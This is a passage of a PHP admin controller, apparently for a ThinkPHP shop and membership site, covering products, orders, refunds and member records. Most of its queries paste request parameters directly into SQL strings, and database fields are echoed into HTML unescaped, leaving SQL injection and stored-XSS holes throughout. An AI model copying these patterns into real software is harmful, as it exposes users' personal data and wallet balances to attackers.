<?php
namespace Admin\Controller;
use Think\Controller;
/**
 * 机构Controller
 */
class AdminController extends Controller {

	public function _initialize() {
		putHeader();
	}

	public function findSetting() {
		$mdset = M('Setting');
		$datalist = $mdset -> select();
		echo json_encode($datalist, JSON_UNESCAPED_UNICODE);
	}

	public function saveSetting() {
		$temp = base64_decode(I('post.content'));
		$content = urldecode($temp);
		$postData = json_decode(urldecode($content), true);
		$arrsql = array();
		$query = new \Think\Model\AdvModel();
		$where1 = $postData['vipdiscount'];
		$where2 = $postData['vipmoney'];
		$arrsql[0] = "update setting set setval='$where1' where setkey='vipdiscount'";
		$arrsql[1] = "update setting set setval='$where2' where setkey='vipmoney'";
		$res = $query -> patchQuery($arrsql);
		//var_dump($arrsql);
		//exit;
		echo '1';
	}

	public function findInformation() {
		$query_sql = "";
		$title = $_REQUEST['title_search'];
		if (!empty($title)) {
			$query_sql = $query_sql . "where title LIKE '%$title%'";
		}
		$iDisplayLength = intval($_REQUEST['iDisplayLength']);
		$iDisplayLength = $iDisplayLength < 0 ? $iTotalRecords : $iDisplayLength;
		$iDisplayStart = intval($_REQUEST['iDisplayStart']);
		$query = new \Think\Model();
		$count_sql = "select count(*) as totalrecord ".
		"from information $query_sql";
		$resultcount = $query -> query($count_sql);
		$iTotalRecords = $resultcount[0]['totalrecord'];
		$condition_sql = "select pkid,title,imgpath as headicon,content,addtime,sortno ".
		"from information $query_sql order by sortno desc limit $iDisplayStart,$iDisplayLength";
		//echo $condition_sql;
		//exit;
		$result = $query -> query($condition_sql);
		$sEcho = intval($_REQUEST['sEcho']);
		$records = array();
		$records["aaData"] = array();
		$sBtn = "";
		$jsparams = "title:$title";
		for ($i = 0; $i < count($result); $i++) {
			$btnEdit = "<a class='btn btn-xs default'  data-toggle='modal' onclick=\"openInformationEdit('".$result[$i]['pkid']."','".$iDisplayStart."','".$jsparams."')\"><i class='fa fa-pencil'></i> &nbsp;编辑&nbsp;</a>";
			$btnDel = "&nbsp;&nbsp;<a class='btn btn-xs default'  data-toggle='modal' onclick=\"openInformationDel('".$result[$i]['pkid']."','".$iDisplayStart."')\"><i class='fa fa-times'></i> &nbsp;删除&nbsp;</a>";
			$records["aaData"][] = array("<div style=\"text-align:center;\">".$result[$i]['sortno']."</div>","<div><a style=\"cursor:pointer;\" data-toggle='modal' onclick=\"openInformationDetail('" . $result[$i]['pkid'] . "')\">".$result[$i]['title']."</a></div>","<div style=\"text-align:center;\">".date('Y-m-d H:i:s',$result[$i]['addtime'])."</div>",$btnEdit.$btnDel);
		}
		if (isset($_REQUEST["sAction"]) && $_REQUEST["sAction"] == "group_action") {
			$records["sStatus"] = "OK";
			// pass custom message(useful for getting status of group actions)
			$records["sMessage"] = "Group action successfully has been completed. Well done!";
			// pass custom message(useful for getting status of group actions)
		}
		$records["sEcho"] = $sEcho;
		$records["iTotalRecords"] = $iTotalRecords;
		$records["iTotalDisplayRecords"] = $iTotalRecords;
		echo json_encode($records, JSON_UNESCAPED_UNICODE);
	}

	public function findInformationByPkid($pkid) {
        $query = new \Think\Model();
        $sql = "select * from information where pkid='$pkid'";
		$data = $query->query($sql);
		$data[0]['addtime'] = date('Y-m-d H:i:s',$data[0]['addtime']);
		echo json_encode($data, JSON_UNESCAPED_UNICODE);
	}
	public function findInformationTop() {
        $query = new \Think\Model();
        $sql = "select title from information where status=1 order by sortno desc limit 1";
		$data = $query->query($sql);
		echo json_encode($data, JSON_UNESCAPED_UNICODE);
	}
	public function findBannerByPkid($pkid) {
		$query = new \Think\Model();
		$sql = "select * from banner where pkid='$pkid'";
		$data = $query -> query($sql);
		echo json_encode($data, JSON_UNESCAPED_UNICODE);
	}

	public function delInformation(){
		$temp = base64_decode(I('post.content'));
        $content = urldecode($temp);
		$postData = json_decode(urldecode($content),true);
		$pkid = $postData['pkid'];
		$mdlcp = M('Information');
		$mdlcp->where("pkid='$pkid'")->delete();
		echo "1";
	}
	
	public function addInformation(){
        $temp = base64_decode(I('post.content'));
        $content = urldecode($temp);
		$mlcp = D('Information');
		$postData = json_decode(urldecode($content),true);
		$postData['pkid'] = uniqid();
		$postData['addtime'] = time();
		$mlcp->add($postData);  
		echo '1';
    }

	public function saveInformation(){
        $temp = base64_decode(I('post.content'));
        $content = urldecode($temp);
		$mlcp = D('Information');
		$postData = json_decode(urldecode($content),true);
		$pkid = $postData['pkid'];
		$mlcp->where("pkid='$pkid'")->save($postData);  
		echo '1';
    }
	public function saveBanner($pkid) {
		$temp = base64_decode(I('post.content'));
		$content = urldecode($temp);
		$mlcp = D('Banner');
		$postData = json_decode(urldecode($content), true);
		$mlcp -> where("pkid='$pkid'") -> save($postData);
		echo '1';
	}
	
	public function findProductSubject() {
		$query_sql = "";
		$name = $_REQUEST['typename_search'];
		if (!empty($name)) {
			if ($query_sql == "")
				$query_sql = " where typename LIKE '%$name%'";
			else
				$query_sql = $query_sql . " and typename LIKE '%$name%'";
		}
		$iDisplayLength = intval($_REQUEST['iDisplayLength']);
		$iDisplayLength = $iDisplayLength < 0 ? $iTotalRecords : $iDisplayLength;
		$iDisplayStart = intval($_REQUEST['iDisplayStart']);
		$query = new \Think\Model();
		$count_sql = "select count(*) as totalrecord " . "from producttype $query_sql";
		$resultcount = $query -> query($count_sql);
		$iTotalRecords = $resultcount[0]['totalrecord'];
		$condition_sql = "select * " . "from producttype $query_sql limit $iDisplayStart,$iDisplayLength";
		$result = $query -> query($condition_sql);
		$sEcho = intval($_REQUEST['sEcho']);
		$records = array();
		$records["aaData"] = array();
		$sBtn = "";
		//$jsparams = "name:$name,level:$level";
		for ($i = 0; $i < count($result); $i++) {
			$btnEdit = "<a class='btn btn-xs default'  data-toggle='modal' onclick=\"openProductSubjectEdit('".$result[$i]['pkid']."','".$iDisplayStart."','".$result[$i]['typename']."')\"><i class='fa fa-pencil'></i> &nbsp;编辑&nbsp;</a>";
			$btnDel = "&nbsp;&nbsp;<a class='btn btn-xs default'  data-toggle='modal' onclick=\"openProductSubjectDel('" . $result[$i]['pkid'] . "','" . $iDisplayStart . "')\"><i class='fa fa-times'></i> &nbsp;删除&nbsp;</a>";
			$records["aaData"][] = array("<div style=\"text-align:left;\">" . $result[$i]['typename'] . "</div>", $btnEdit.$btnDel);
		}
		if (isset($_REQUEST["sAction"]) && $_REQUEST["sAction"] == "group_action") {
			$records["sStatus"] = "OK";
			// pass custom message(useful for getting status of group actions)
			$records["sMessage"] = "Group action successfully has been completed. Well done!";
			// pass custom message(useful for getting status of group actions)
		}
		$records["sEcho"] = $sEcho;
		$records["iTotalRecords"] = $iTotalRecords;
		$records["iTotalDisplayRecords"] = $iTotalRecords;
		echo json_encode($records, JSON_UNESCAPED_UNICODE);
	}

	public function delProductSubject() {
		$temp = base64_decode(I('post.content'));
		$content = urldecode($temp);
		$postData = json_decode(urldecode($content), true);
		$pkid = $postData['pkid'];
		$mdlcp = M('Producttype');
		$mdlcp -> where("pkid='$pkid'") -> delete();
		echo "1";
	}
	
	public function saveProductSubject() {
		$temp = base64_decode(I('post.content'));
		$content = urldecode($temp);
		$postData = json_decode(urldecode($content), true);
		$pkid = $postData['pkid'];
		$mdlcp = M('Producttype');
		$mdlcp -> where("pkid='$pkid'") -> save($postData);
		echo "1";
	}
	
	public function addProductSubject() {
		$temp = base64_decode(I('post.content'));
		$content = urldecode($temp);
		$mlcp = D('Producttype');
		$postData = json_decode(urldecode($content), true);
		$postData['pkid'] = uniqid();
		$mlcp -> add($postData);
		echo '1';
	}
	
	public function findExperience() {
		$query_sql = "";
		$iDisplayLength = intval($_REQUEST['iDisplayLength']);
		$iDisplayLength = $iDisplayLength < 0 ? $iTotalRecords : $iDisplayLength;
		$iDisplayStart = intval($_REQUEST['iDisplayStart']);
		$query = new \Think\Model();
		$count_sql = "select count(*) as totalrecord " . "from experience";
		$resultcount = $query -> query($count_sql);
		$iTotalRecords = $resultcount[0]['totalrecord'];
		$condition_sql = "select *" . "from experience order by feedtime desc limit $iDisplayStart,$iDisplayLength";
		$result = $query -> query($condition_sql);
		$sEcho = intval($_REQUEST['sEcho']);
		$records = array();
		$records["aaData"] = array();
		$sBtn = "";
		$jsparams = "";
		for ($i = 0; $i < count($result); $i++) {
			$content = $result[$i]['content'];
			if (strlen($content) > 50) {
				$content = substr($content, 0, 50) . '...';
			}
			$records["aaData"][] = array("<div class=\"product-label\"><span><a style=\"cursor:pointer;\" data-toggle='modal' onclick=\"openExperienceDetail('" . $result[$i]['pkid'] . "')\">" . $content . "</a></span></div>", "<div style=\"text-align:center;\">" . $result[$i]['contactperson'] . "</div>", "<div style=\"text-align:center;\">" . $result[$i]['contact'] . "</div>", "<div style=\"text-align:center;\" class=\"product-label\"><span>" . $result[$i]['uname'] . "</span></div>", "<div style=\"text-align:center;\">" . date('Y-m-d H:i:s', $result[$i]['feedtime']) . "</div>");
		}
		if (isset($_REQUEST["sAction"]) && $_REQUEST["sAction"] == "group_action") {
			$records["sStatus"] = "OK";
			// pass custom message(useful for getting status of group actions)
			$records["sMessage"] = "Group action successfully has been completed. Well done!";
			// pass custom message(useful for getting status of group actions)
		}
		$records["sEcho"] = $sEcho;
		$records["iTotalRecords"] = $iTotalRecords;
		$records["iTotalDisplayRecords"] = $iTotalRecords;
		echo json_encode($records, JSON_UNESCAPED_UNICODE);
	}

	public function findExperienceByPkid($pkid) {
		$query = new \Think\Model();
		$sql = "select * from experience where pkid='$pkid'";
		$data = $query -> query($sql);
		$data[0]['feedtime'] = date('Y-m-d H:i:s', $data[0]['feedtime']);
		echo json_encode($data, JSON_UNESCAPED_UNICODE);
	}
	
	public function findProduct() {
		$query_sql = "where";
		$pdname = $_REQUEST['pdname_search'];
		$updowntag = $_REQUEST['updowntag_search'];
		if (!empty($pdname)) {
			if($query_sql=="where")
				$query_sql = $query_sql . " pdname LIKE '%$pdname%'";
			else
				$query_sql = $query_sql . " and pdname LIKE '%$pdname%'";
		}
		if ($updowntag!="") {
			if($query_sql=="where")
				$query_sql = $query_sql . " updowntag='$updowntag'";
			else
				$query_sql = $query_sql . " and updowntag='$updowntag'";
		}
		if($query_sql=="where")
			$query_sql = "";
		$iDisplayLength = intval($_REQUEST['iDisplayLength']);
		$iDisplayStart = intval($_REQUEST['iDisplayStart']);
		$query = new \Think\Model();
		$count_sql = "select count(*) as totalrecord ".
		"from product $query_sql";
		$resultcount = $query -> query($count_sql);
		$iTotalRecords = $resultcount[0]['totalrecord'];
		$iDisplayLength = $iDisplayLength < 0 ? $iTotalRecords : $iDisplayLength;
		$condition_sql = "select * from product $query_sql order by sortno desc limit $iDisplayStart,$iDisplayLength";
		$result = $query -> query($condition_sql);
		$sEcho = intval($_REQUEST['sEcho']);
		$records = array();
		$records["aaData"] = array();
		$sBtn = "";
		$jsparams = "pdname:$pdname,updowntag:$updowntag";
		for ($i = 0; $i < count($result); $i++) {
			$btnEdit = "<a class='btn btn-xs default'  data-toggle='modal' onclick=\"openProductEdit('".$result[$i]['pkid']."','".$iDisplayStart."','".$jsparams."')\"><i class='fa fa-pencil'></i> &nbsp;编辑&nbsp;</a>";
			$btnDel = "&nbsp;&nbsp;<a class='btn btn-xs default'  data-toggle='modal' onclick=\"openProductDel('".$result[$i]['pkid']."','".$iDisplayStart."')\"><i class='fa fa-times'></i> &nbsp;删除&nbsp;</a>";
			$updownstr = "";
			if($result[$i]['updowntag']==1){
				$updownstr = "上架";
			}elseif($result[$i]['updowntag']==0){
				$updownstr = "下架";
			}
			$records["aaData"][] = array("<div style=\"text-align:center;\">".$result[$i]['sortno']."</div>","<div class=\"product-img-label\"><a href='" . PIC_FOLDER . $result[$i]['imgpath'] . "' id='fbox_" . $i . "' class='fancybox-button' data-rel='fancybox-button'><img src='" . PIC_FOLDER . $result[$i]['imgpath'] . "' alt=''></a><span><a style=\"cursor:pointer;\" data-toggle='modal' onclick=\"openProductDetail('" . $result[$i]['pkid'] . "')\">".$result[$i]['pdname']."</a></span></div>","<div style=\"text-align:center;\">普通 : ".$result[$i]['generalprice']."<br />尊贵 : ".$result[$i]['vipprice']."</div>","<div style=\"text-align:center;\">".$updownstr."</div>",$btnEdit.$btnDel);
		}
		if (isset($_REQUEST["sAction"]) && $_REQUEST["sAction"] == "group_action") {
			$records["sStatus"] = "OK";
			// pass custom message(useful for getting status of group actions)
			$records["sMessage"] = "Group action successfully has been completed. Well done!";
			// pass custom message(useful for getting status of group actions)
		}
		$records["sEcho"] = $sEcho;
		$records["iTotalRecords"] = $iTotalRecords;
		$records["iTotalDisplayRecords"] = $iTotalRecords;
		echo json_encode($records, JSON_UNESCAPED_UNICODE);
	}
	public function findProductByPkid($pkid) {
        $query = new \Think\Model();
        $sql = "select * from product where pkid='$pkid'";
		$data = $query->query($sql);
		echo json_encode($data, JSON_UNESCAPED_UNICODE);
	}
	public function delProduct(){
		$temp = base64_decode(I('post.content'));
        $content = urldecode($temp);
		$postData = json_decode(urldecode($content),true);
		$pkid = $postData['pkid'];
		$mdlcp = M('Product');
		$mdlcp->where("pkid='$pkid'")->delete();
		echo "1";
	}
	public function addProduct(){
        $temp = base64_decode(I('post.content'));
        $content = urldecode($temp);
		$mlcp = D('Product');
		$postData = json_decode(urldecode($content),true);
		if($postData['vipprice']==""){
			$mset = D('Setting');
			$objSetting = $mset->where("setkey='vipdiscount'")->find();
			$discount = $objSetting['setval'];
			$postData['vipprice'] = $postData['generalprice']*$discount;
		}
		$postData['pkid'] = uniqid();
		$mlcp->add($postData);  
		echo '1';
    }
	public function saveProduct(){
        $temp = base64_decode(I('post.content'));
        $content = urldecode($temp);
		$mdpdp = D('Product');
		$postData = json_decode(urldecode($content),true);
		if($postData['vipprice']==""){
			$mset = D('Setting');
			$objSetting = $mset->where("setkey='vipdiscount'")->find();
			$discount = $objSetting['setval'];
			$postData['vipprice'] = $postData['generalprice']*$discount;
		}
		$pkid = $postData['pkid'];
		$mdpdp->where("pkid='$pkid'")->save($postData);  
		echo '1';
    }
	public function findProductTypeSelect() {
        $query = new \Think\Model();
        $sql = "select * from producttype";
		$data = $query->query($sql);
		echo json_encode($data, JSON_UNESCAPED_UNICODE);
	}
	public function findProductOrderByStatus($status) {
		$query = new \Think\Model();
		$condition_sql = "";
		$count_sql = "";
		$query_sql = "";
		$countquery_sql = "";
		$orderid = $_REQUEST['keyword_search'];
		$buyername = $_REQUEST['buyername_search'];
		if (!empty($orderid)) {
			$query_sql = $query_sql . " and main.pkid='$orderid'";
			$countquery_sql = $countquery_sql . " and pkid='$orderid'";
		}
		if ($buyername!="") {
			$query_sql = $query_sql . " and main.buyername LIKE '%$buyername%'";
			$countquery_sql = $countquery_sql . " and buyername LIKE '%$buyername%'";
		}
		$iDisplayLength = intval($_REQUEST['iDisplayLength']);
		$iDisplayStart = intval($_REQUEST['iDisplayStart']);
		if ($status == 0) {
			$count_sql = "select count(*) as totalrecord from ordermain where (status=1 or status=2) $countquery_sql";
			$condition_sql = "select item.pkid as itemid,main.buytime,main.pkid,item.productname,item.productid,item.productprice,item.productcount,main.`status`,item.imgpath,main.buyername,main.buyer,main.paytime,main.prerefundtime,main.refundtime,main.cancletime,main.ivtime,main.price,main.buycount,main.buyermobile from ordermain as main right join orderdetail as item on item.orderid = main.pkid where (main.status=1 or main.status=2) $query_sql order by main.pkid,main.buytime desc limit $iDisplayStart,$iDisplayLength";
		}
		if ($status == 1) {
			$count_sql = "select count(*) as totalrecord from ordermain where (status=3 or status=4 or status=5 or status=6) $countquery_sql";
			$condition_sql = "select item.pkid as itemid,main.buytime,main.pkid,item.productname,item.productid,item.productprice,item.productcount,main.`status`,item.imgpath,main.buyername,main.buyer,main.paytime,main.prerefundtime,main.refundtime,main.cancletime,main.ivtime,main.price,main.buycount,main.buyermobile from ordermain as main right join orderdetail as item on item.orderid = main.pkid where (main.status=3 or main.status=4 or main.status=5 or main.status=6) $query_sql order by main.pkid,main.buytime desc limit $iDisplayStart,$iDisplayLength";
		}
		$resultcount = $query -> query($count_sql);
		$result = $query -> query($condition_sql);
		$iTotalRecords = $resultcount[0]['totalrecord'];
		$iDisplayLength = $iDisplayLength < 0 ? $iTotalRecords : $iDisplayLength;
		$sEcho = intval($_REQUEST['sEcho']);
		$records = array();
		$records["aaData"] = array();
		$jsparams = "keyword:$orderid,buyername:$updowntag";
		//操作按钮
		for ($i = 0; $i < count($result); $i++) {
			$date_format = date("Y-m-d H:i:s", $result[$i]['buytime']);
			$records["aaData"][] = array("单号: " . $result[$i]['pkid'] . "<br/>时间: " . $date_format, "<div class='product-img-label'>
			<img  src='" . PIC_FOLDER . $result[$i]['imgpath'] . "'><span><a href=\"javascript:;\" onclick=\"openProductDetail('" . $result[$i]['productid'] . "')\">" . $result[$i]['productname'] . "</a></span></div>", "<span class='font-highlight-custom'>￥" . $result[$i]['productprice'] . "</span>", "×" . $result[$i]['productcount'], $result[$i]['buyername'], getStatus($result[$i]['status']) . "<br/><span bid=" . $result[$i]['pkid'] . " class='font-highlight-custom'>总额: ￥" . $result[$i]['price'] . "</span>", "<div><a class='btn btn-xs default btn-editable' data-toggle='modal' onclick=\"openOrderDetail('" . $result[$i]['pkid'] . "')\">
			<i class='fa fa-search-plus'></i> 详情</a></div>" . $this -> getOptBtn($result[$i]['status'], $result[$i]['pkid'], $iDisplayStart));
		}
		if (isset($_REQUEST["sAction"]) && $_REQUEST["sAction"] == "group_action") {
			$records["sStatus"] = "OK";
			// pass custom message(useful for getting status of group actions)
			$records["sMessage"] = "Group action successfully has been completed. Well done!";
			// pass custom message(useful for getting status of group actions)
		}
		$records["sEcho"] = $sEcho;
		$records["iTotalRecords"] = $iTotalRecords;
		$records["iTotalDisplayRecords"] = $iTotalRecords;
		echo json_encode($records);
	}

 	public function findProductOrderByPkid($pkid){
        $querymain = M('ordermain');
        $datamain = $querymain->where("pkid='$pkid'")->find();
        if(empty($datamain)!=1){
            if(isset($datamain['refundtime']) && $datamain['refundtime']>0){
                $datamain['refundtime'] = date("Y-m-d H:i", $datamain['refundtime']);
            }
			if(isset($datamain['cancletime']) && $datamain['cancletime']>0){
                $datamain['cancletime'] = date("Y-m-d H:i", $datamain['cancletime']);
            }
            if(isset($datamain['paytime']) && $datamain['paytime']>0){
                $datamain['paytime'] = date("Y-m-d H:i", $datamain['paytime']);
            }
            if(isset($datamain['prerefundtime'])&& $datamain['prerefundtime']>0){
                $datamain['prerefundtime'] = date("Y-m-d H:i", $datamain['prerefundtime']);
            }
            $datamain['status'] = getStatus($datamain['status']);
            $datamain['buytime'] = date("Y-m-d H:i", $datamain['buytime']);
			$datamain['ivtime'] = date("Y-m-d H:i", $datamain['ivtime']);
            $query = new \Think\Model();
			$sql = "select * from orderdetail where orderid='$pkid'";
			$datamain['itemlist'] = $query -> query($sql);
            $this->show(json_encode($datamain,JSON_UNESCAPED_UNICODE));
        }else {
            $this->show("no");
        }
    }

	public function countProductOrder($status) {
		$query = new \Think\Model();
		$count_sql = "";
		if ($status == 0) {
			$count_sql = "select count(*) from ordermain where status=1 or status=2";
		}
		if ($status == 1) {
			$count_sql = "select count(*) from ordermain where status=3 or status=4 or status=5 or status=6";
		}
		if($count_sql!="")
		{
			$result = $query -> query($count_sql);
			echo $result[0]['count(*)'];
		}else{
			echo "-";
		}
	}
	
	public function confirmProductOrder(){
		$temp = base64_decode(I('post.content'));
        $content = urldecode($temp);
		$postData = json_decode(urldecode($content),true);
		$pkid = $postData['pkid'];
		$order = M('Ordermain');
		$postData['status'] = 5;
		$postData['ivtime'] = time();
		$order -> data($postData) -> where("pkid = '$pkid' and status=1") -> save();
		echo "1";
	}
	public function refundProductOrder(){
		$temp = base64_decode(I('post.content'));
        $content = urldecode($temp);
		$postData = json_decode(urldecode($content),true);
		$pkid = $postData['pkid'];
		$order = M('Ordermain');
		$postData['status'] = 4;
		$postData['refundtime'] = time();
		//查询订单信息
		$objorder = $order->where("pkid='$pkid' and status=2")->find();
		 if(empty($objorder)!=1){
			$order -> data($postData) -> where("pkid = '$pkid' and status=2") -> save();
			$userid = $objorder['buyer'];
			$totalmoney = $objorder['price'];
			//同时更新和插入log到钱包
			$wallet = M('Wallet');
			$wallet -> where("userid='$userid'")->setInc('wallet',$totalmoney);
			$objwallet = $wallet->where("userid='$userid'")->find();
			$usermoney = $objwallet['wallet'];
			$walletlog = M('Walletlog');
			$objLog['pkid'] = uniqid();
			$objLog['userid'] = $userid;
			$objLog['wallet'] = $usermoney;
			$objLog['money'] = $totalmoney;
			$objLog['ivtime'] = time();
			$objLog['type'] = 3;
			$objLog['direction'] = 1;
			$objLog['orderid'] = $pkid;
			$walletlog -> data($objLog) -> add();
			echo "1";
		 }else{
		 	echo "0";
		 }
	}
	public function cancelRefundProductOrder(){
		$temp = base64_decode(I('post.content'));
        $content = urldecode($temp);
		$postData = json_decode(urldecode($content),true);
		$pkid = $postData['pkid'];
		$order = M('Ordermain');
		$postData['status'] = 3;
		$postData['ivtime'] = time();
		$order -> data($postData) -> where("pkid = '$pkid' and status=2") -> save();
		echo "1";
	}
	
	public function findMember() {
		$query_sql = "where";
		$countquery_sql = "where";
		$realname = $_REQUEST['realname_search'];
		$mobile = $_REQUEST['mobile_search'];
		$idno = $_REQUEST['idno_search'];
		if (!empty($realname)) {
			if($query_sql=="where"){
				$query_sql = $query_sql . " m.realname LIKE '%$realname%'";
				$countquery_sql = $countquery_sql . " realname LIKE '%$realname%'";
			}
			else{
				$query_sql = $query_sql . " and m.realname LIKE '%$realname%'";
				$countquery_sql = $countquery_sql . " and realname LIKE '%$realname%'";
			}
		}
		if (!empty($mobile)) {
			if($query_sql=="where"){
				$query_sql = $query_sql . " m.mobile = '$mobile'";
				$countquery_sql = $countquery_sql . " mobile = '$mobile'";
			}
			else{
				$query_sql = $query_sql . " and m.mobile = '$mobile'";
				$countquery_sql = $countquery_sql . " and mobile = '$mobile'";
			}
		}
		if (!empty($idno)) {
			if($query_sql=="where"){
				$query_sql = $query_sql . " m.idno = '$idno'";
				$countquery_sql = $countquery_sql . " idno = '$idno'";
			}
			else{
				$query_sql = $query_sql . " and m.idno = '$idno'";	
				$countquery_sql = $countquery_sql . " and idno = '$idno'";
			}
		}
		if($query_sql=="where"){
			$query_sql = "";
			$countquery_sql = "";
		}
		$iDisplayLength = intval($_REQUEST['iDisplayLength']);
		$iDisplayStart = intval($_REQUEST['iDisplayStart']);
		$query = new \Think\Model();
		$count_sql = "select count(*) as totalrecord ".
		"from memberinfo $countquery_sql";
		$resultcount = $query -> query($count_sql);
		$iTotalRecords = $resultcount[0]['totalrecord'];
		$iDisplayLength = $iDisplayLength < 0 ? $iTotalRecords : $iDisplayLength;
		$condition_sql = "select m.*,l.levelname from memberinfo as m left join levelsetting as l on m.levelid=l.pkid $query_sql order by regtime desc limit $iDisplayStart,$iDisplayLength";
		$result = $query -> query($condition_sql);
		$sEcho = intval($_REQUEST['sEcho']);
		$records = array();
		$records["aaData"] = array();
		$sBtn = "";
		$jsparams = "realname:$realname,mobile:$mobile,idno:$idno";
		for ($i = 0; $i < count($result); $i++) {
			$btnEdit = "<a class='btn btn-xs default'  data-toggle='modal' onclick=\"openMemberEdit('".$result[$i]['pkid']."','".$iDisplayStart."','".$jsparams."')\"><i class='fa fa-pencil'></i> &nbsp;编辑&nbsp;</a>";
			$records["aaData"][] = array("<div class=\"product-label\"><span><a style=\"cursor:pointer;\" data-toggle='modal' onclick=\"openMemberDetail('" . $result[$i]['pkid'] . "')\">".$result[$i]['realname']."</a></span></div>","<div class=\"product-label\" style=\"text-align:center;\"><span>".$result[$i]['mobile']."</span></div>","<div class=\"product-label\" style=\"text-align:center;\">".$result[$i]['idno']."</div>",$btnEdit);
		}
		if (isset($_REQUEST["sAction"]) && $_REQUEST["sAction"] == "group_action") {
			$records["sStatus"] = "OK";
			// pass custom message(useful for getting status of group actions)
			$records["sMessage"] = "Group action successfully has been completed. Well done!";
			// pass custom message(useful for getting status of group actions)
		}
		$records["sEcho"] = $sEcho;
		$records["iTotalRecords"] = $iTotalRecords;
		$records["iTotalDisplayRecords"] = $iTotalRecords;
		echo json_encode($records, JSON_UNESCAPED_UNICODE);
	}
	public function findMemberReview() {
		$query_sql = "where";
		$countquery_sql = "where";
		$pkid = $_REQUEST['pkid_search'];
		$realname = $_REQUEST['realname_search'];
		$mobile = $_REQUEST['mobile_search'];
		$idno = $_REQUEST['idno_search'];
		if (!empty($pkid)) {
			if($query_sql=="where"){
				$query_sql = $query_sql . " m.pkid ='$pkid'";
				$countquery_sql = $countquery_sql . " pkid='$pkid'";
			}
			else{
				$query_sql = $query_sql . " and m.pkid ='$pkid'";
				$countquery_sql = $countquery_sql . " and pkid='$pkid'";
			}
		}
		if (!empty($realname)) {
			if($query_sql=="where"){
				$query_sql = $query_sql . " m.realname LIKE '%$realname%'";
				$countquery_sql = $countquery_sql . " realname LIKE '%$realname%'";
			}
			else{
				$query_sql = $query_sql . " and m.realname LIKE '%$realname%'";
				$countquery_sql = $countquery_sql . " and realname LIKE '%$realname%'";
			}
		}
		if (!empty($mobile)) {
			if($query_sql=="where"){
				$query_sql = $query_sql . " m.mobile = '$mobile'";
				$countquery_sql = $countquery_sql . " mobile = '$mobile'";
			}
			else{
				$query_sql = $query_sql . " and m.mobile = '$mobile'";
				$countquery_sql = $countquery_sql . " and mobile = '$mobile'";
			}
		}
		if (!empty($idno)) {
			if($query_sql=="where"){
				$query_sql = $query_sql . " m.idno = '$idno'";
				$countquery_sql = $countquery_sql . " idno = '$idno'";
			}
			else{
				$query_sql = $query_sql . " and m.idno = '$idno'";	
				$countquery_sql = $countquery_sql . " and idno = '$idno'";
			}
		}
		if($query_sql=="where"){
			$query_sql = $query_sql." m.status=2";
			$countquery_sql = $countquery_sql." status=2";
		}else{
			$query_sql = $query_sql." and m.status=2";
			$countquery_sql = $countquery_sql." and status=2";
		}
		$iDisplayLength = intval($_REQUEST['iDisplayLength']);
		$iDisplayStart = intval($_REQUEST['iDisplayStart']);
		$query = new \Think\Model();
		$count_sql = "select count(*) as totalrecord ".
		"from memberinfo $countquery_sql";
		$resultcount = $query -> query($count_sql);
		$iTotalRecords = $resultcount[0]['totalrecord'];
		$iDisplayLength = $iDisplayLength < 0 ? $iTotalRecords : $iDisplayLength;
		$condition_sql = "select m.*,l.levelname from memberinfo as m left join levelsetting as l on m.levelid=l.pkid $query_sql order by regtime desc limit $iDisplayStart,$iDisplayLength";
		$result = $query -> query($condition_sql);
		$sEcho = intval($_REQUEST['sEcho']);
		$records = array();
		$records["aaData"] = array();
		$sBtn = "";
		$jsparams = "realname:$realname,mobile:$mobile,idno:$idno,pkid:$pkid";
		for ($i = 0; $i < count($result); $i++) {
			$btnConfirm = "<a class='btn btn-xs default green'  data-toggle='modal' onclick=\"openMemberConfirm('".$result[$i]['pkid']."','".$iDisplayStart."','".$jsparams."')\"><i class='fa fa-pencil'></i> &nbsp;通过&nbsp;</a>";
			$btnReject = "<a class='btn btn-xs default red'  data-toggle='modal' onclick=\"openMemberReject('".$result[$i]['pkid']."','".$iDisplayStart."','".$jsparams."')\"><i class='fa fa-pencil'></i> &nbsp;拒绝&nbsp;</a>";
			$records["aaData"][] = array("<div class=\"product-label\"><span>".$result[$i]['pkid']."</span></div>","<div class=\"product-label\"><span><a style=\"cursor:pointer;\" data-toggle='modal' onclick=\"openMemberDetail('" . $result[$i]['pkid'] . "')\">".$result[$i]['realname']."</a></span></div>","<div class=\"product-label\" style=\"text-align:center;\"><span>".$result[$i]['mobile']."</span></div>","<div class=\"product-label\" style=\"text-align:center;\">".$result[$i]['idno']."</div>",$btnConfirm."&nbsp;&nbsp;".$btnReject);
		}
		if (isset($_REQUEST["sAction"]) && $_REQUEST["sAction"] == "group_action") {
			$records["sStatus"] = "OK";
			// pass custom message(useful for getting status of group actions)
			$records["sMessage"] = "Group action successfully has been completed. Well done!";
			// pass custom message(useful for getting status of group actions)
		}
		$records["sEcho"] = $sEcho;
		$records["iTotalRecords"] = $iTotalRecords;
		$records["iTotalDisplayRecords"] = $iTotalRecords;
		echo json_encode($records, JSON_UNESCAPED_UNICODE);
	}
	public function findMemberByPkid($pkid) {
        $query = new \Think\Model();
        $sql = "select m.*,l.levelname from memberinfo as m left join levelsetting as l on m.levelid=l.pkid where m.pkid='$pkid'";
		$data = $query->query($sql);
		if($data[0]['status']=='0')
			$data[0]['status']="普通会员";
		elseif($data[0]['status']=='1')
			$data[0]['status']="认证会员";
		elseif($data[0]['status']=='2')
			$data[0]['status']="待认证";
		elseif($data[0]['status']=='3')
			$data[0]['status']="尊贵会员";
		elseif($data[0]['status']=='4')
			$data[0]['status']="审核不通过";
		
		$data[0]['birthday'] = date('Y-m-d',$data[0]['birthday']);
		
		echo json_encode($data, JSON_UNESCAPED_UNICODE);
	}
	public function reviewMember(){
		$temp = base64_decode(I('post.content'));
        $content = urldecode($temp);
		$postData = json_decode(urldecode($content),true);
		$pkid = $postData['pkid'];
		$order = M('Memberinfo');
		$postData['status'] = 1;
		$order -> data($postData) -> where("pkid = '$pkid' and status=2") -> save();
		echo "1";
	}
	public function rejectMember(){
		$temp = base64_decode(I('post.content'));
        $content = urldecode($temp);
		$postData = json_decode(urldecode($content),true);
		$pkid = $postData['pkid'];
		$order = M('Memberinfo');
		$postData['status'] = 4;
		$order -> data($postData) -> where("pkid = '$pkid' and status=2") -> save();
		echo "1";
	}
	public function saveMember(){
        $temp = base64_decode(I('post.content'));
        $content = urldecode($temp);
		$mdpdp = D('Memberinfo');
		$postData = json_decode(urldecode($content),true);
		$pkid = $postData['pkid'];
		$postData['birthday'] = strtotime($postData['birthday']);
		$mdpdp->where("pkid='$pkid'")->save($postData);
		echo '1';
    }
	public function findWalletLog() {
		$query_sql = "where";
		$countquery_sql = "where";
		$pkid = $_REQUEST['pkid_search'];
